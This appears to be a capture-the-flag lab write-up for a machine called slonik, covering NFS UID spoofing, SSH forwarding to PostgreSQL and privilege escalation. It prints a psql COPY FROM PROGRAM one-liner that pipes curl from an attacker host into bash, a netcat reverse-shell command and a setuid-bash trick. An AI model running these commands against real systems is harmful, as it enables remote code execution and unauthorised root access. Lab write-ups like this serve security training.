# Enumeration

We find a nfs and mount it:
![](attachment/9e26fa56d86becadcfef2cf9970410ab.png)
Service folder is owner by 1337

So we can create a user called 1337
```
sudo groupadd -g 1337 1337
sudo useradd -u 1337 -g 1337 1337
```

Then accessing the folder:
![](attachment/fc072b1bfd2cd495ab0292cf09fe4d4d.png)

Now we have hash of password:
![](attachment/600c0be9f9947f1d9d2cef582445df15.png)

Now looking at .bash_history:
![](attachment/a9ce92643c9dacab532726d77f1cdbd1.png)

Now using ssh port forwarding:
```
ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@slonik.vl
```

Now we can open postgres
```
 psql -h /tmp -U postgres
```

![](attachment/92b5e8d98dd005c193d8325de30a0a62.png)
Now using this [article](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
We can read files:
![](attachment/fc94b67852592fad6ded0a4abc6284aa.png)Using psql oneliner:
```
service=# DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'curl <http://10.8.1.208/x> | bash';DROP TABLE IF EXISTS cmd_exec
```

Using a reverse shell command:
```
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.208 443 >/tmp/f';
```

Now we can get ssh access:
![](attachment/3122eabd2b1f6edc07a9e5d7b22aec70.png)
Using pspy:
![](attachment/71d412160b56a41f8d39662b5721c8b3.png)
This /usr/bin/backup:
![](attachment/be577a65f61ae6f255233b3fe69b569c.png)
Now we found the folder that was being backed up at `/var/lib/postgresql/14/main`


Now copying bash files to the directory and giving setuid bit:
`cp /bin/bash mybash`
`chmod u+s mybash`

Now in `/opt/backups/current/` we have mybash and executing it we get a root shell:
![](attachment/1253232211f8474d7199ced7e8dc3ca3.png)
